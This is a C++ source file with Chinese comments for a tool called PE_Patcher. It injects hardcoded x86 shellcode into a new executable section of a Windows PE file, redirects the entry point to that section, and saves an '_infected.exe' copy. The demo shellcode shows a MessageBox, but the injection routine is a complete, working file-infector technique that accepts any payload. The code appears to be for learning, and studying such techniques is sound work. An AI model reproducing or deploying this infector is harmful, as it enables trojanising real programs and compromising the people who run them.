#include <iostream>
#include <Windows.h>
#include <WinTrust.h>
#pragma warning(disable : 4996)

// 指定的shellcode，模拟恶意代码。功能：MessageBox
char x86_nullfree_msgbox[] =
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
"\x49\x0b\x31\xc0\x51\x50\xff\xd7";

#define getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)->e_lfanew)) // 获取NT头
#define getSectionArr(buf) (IMAGE_FIRST_SECTION(getNtHdr(buf))) // 获取section header数组的起始地址
#define P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align)) // 计算size按align对齐需要的大小。例如：P2ALIGNUP(0x30, 0x200) = 0x200, P2ALIGNUP(0x201, 0x200) = 0x400

bool readBinFile(const char fileName[], char** bufPtr, DWORD& length)
{
	if (FILE* fp = fopen(fileName, "rb"))
	{
		fseek(fp, 0, SEEK_END);
		length = ftell(fp);
		*bufPtr = new char[length + 1];
		fseek(fp, 0, SEEK_SET);
		fread(*bufPtr, sizeof(char), length, fp);
		return true;
	}
	return false;
}

int main(int argc, char** argv)
{
	if (argc != 2)
	{
		puts("[!] usage: ./PE_Patcher.exe [path/to/file]");
		return 0;
	}

	// 1. 读取本地PE文件
	char* buff; DWORD fileSize;
	if (!readBinFile(argv[1], &buff, fileSize))
	{
		puts("[!] selected file not found.");
		return 0;
	}

	// 2. 判断PE Header 剩余空间是否足够容纳一个新的Section Header
	DWORD sectHdrSize = sizeof(IMAGE_SECTION_HEADER); // 固定值40
	auto pSectionHeaders = getSectionArr(buff);
	DWORD peHdrRemainSize = (DWORD_PTR)(buff + pSectionHeaders[0].PointerToRawData) - (DWORD_PTR)(pSectionHeaders + getNtHdr(buff)->FileHeader.NumberOfSections);
	if (peHdrRemainSize < sectHdrSize)
	{
		puts("[!] Insufficient remaining PE header size.");
		return 0; // 此处未考虑当剩余空间不足的情况，如果空间不足，可以将Section Data整体后移一个 FileAlignment 大小的位置，为 PE Header 腾出一个 FileAlignment 大小的空间
	}

	// 3. 为输出文件申请内存
	puts("[+] malloc memory for outputed *.exe file.");
	size_t sectAlign = getNtHdr(buff)->OptionalHeader.SectionAlignment; // 内存页对齐大小，即：执行时在内存中加载的区段的对齐方式，默认值是系统页大小
	size_t fileAlign = getNtHdr(buff)->OptionalHeader.FileAlignment; // 文件对齐大小，即：静态PE文件中区段的对齐方式
	size_t finalOutSize = fileSize + P2ALIGNUP(sizeof(x86_nullfree_msgbox), fileAlign); // 计算输出exe的文件大小，即：原PE文件大小 + 新增Section大小(按FileAlignment对齐)
	char* outBuf = (char*)malloc(finalOutSize);
	memcpy(outBuf, buff, fileSize); // 先将原PE文件内容拷贝至输出buf中

	// 4. 更新新增Section header的字段
	puts("[+] create a new section to store shellcode.");
	auto sectArr = getSectionArr(outBuf);
	PIMAGE_SECTION_HEADER lastestSecHdr = &sectArr[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1]; // 最后一个section header
	PIMAGE_SECTION_HEADER newSectionHdr = lastestSecHdr + 1; // 新增的section header
	memcpy(newSectionHdr->Name, ".duanxd", 8); // 新增的section名称
	newSectionHdr->Misc.VirtualSize = P2ALIGNUP(sizeof(x86_nullfree_msgbox), sectAlign); // 程序执行时加载到内存中的当前Section Data的大小，按SectionAlignment对齐
	newSectionHdr->VirtualAddress = P2ALIGNUP((lastestSecHdr->VirtualAddress + lastestSecHdr->Misc.VirtualSize), sectAlign); // 程序执行时加载到内存中的当前Section Data的相对于ImageBase的偏移量
	newSectionHdr->SizeOfRawData = sizeof(x86_nullfree_msgbox); // 设置新增section在磁盘静态存储文件中的大小
	newSectionHdr->PointerToRawData = lastestSecHdr->PointerToRawData + lastestSecHdr->SizeOfRawData; // 设置新增区块在磁盘静态存储文件中的偏移量，
	// 等于原先最后一个Section的偏移 + 大小，即：原先最后一个Section Data末尾
	newSectionHdr->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE; // 此section的属性，可读可写可执行

	// 5. 拷贝新增Section Data到指定位置
	puts("[+] pack x86 shellcode into new section.");
	memcpy(outBuf + newSectionHdr->PointerToRawData, x86_nullfree_msgbox, sizeof(x86_nullfree_msgbox));

	// 6. 更新File Header 和 Optional Header
	getNtHdr(outBuf)->FileHeader.NumberOfSections += 1; // section数量+1

	puts("[+] fix image size in memory.");
	getNtHdr(outBuf)->OptionalHeader.SizeOfImage =
		getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].VirtualAddress +
		getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].Misc.VirtualSize; // SizeOfImage，即内存映象大小，= 最后一个Section Data的相对于ImageBase的偏移量 + Section Data加载到内存中的大小

	puts("[+] point EP to shellcode.");
	printf("[+] Dynamic EntryPoint @ %p\n", getNtHdr(outBuf)->OptionalHeader.AddressOfEntryPoint);
	getNtHdr(outBuf)->OptionalHeader.AddressOfEntryPoint = newSectionHdr->VirtualAddress; // 程序入口点，将EntryPoint设置为新增Section处

	puts("[+] repair virtual size. (consider *.exe built by old compiler)");
	for (size_t i = 1; i < getNtHdr(outBuf)->FileHeader.NumberOfSections; i++)
		sectArr[i - 1].Misc.VirtualSize = sectArr[i].VirtualAddress - sectArr[i - 1].VirtualAddress;

	// 7. 将注入以后的文件写入磁盘
	char outputPath[MAX_PATH];
	memcpy(outputPath, argv[1], sizeof(outputPath));
	strcpy(strrchr(outputPath, '.'), "_infected.exe");
	FILE* fp = fopen(outputPath, "wb");
	fwrite(outBuf, 1, finalOutSize, fp);
	fclose(fp);

	printf("[+] file saved at %s\n", outputPath);
	puts("[+] done.");
	return 0;
}